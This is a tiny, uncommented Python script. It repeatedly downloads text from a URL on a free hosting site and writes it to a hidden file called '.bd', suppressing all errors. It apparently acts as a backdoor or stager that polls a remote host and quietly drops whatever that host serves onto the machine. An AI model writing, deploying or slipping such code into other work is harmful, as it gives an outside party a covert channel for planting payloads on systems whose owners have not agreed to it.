import requests
from os import system as sys

try:
    while True:
        p = requests.get('https://foofooco.000webhostapp.com/Bd/f_bd')
        f = open('.bd', 'w+')
        f.write(p.text)
        sys('sleep 2')
except:
    quit()
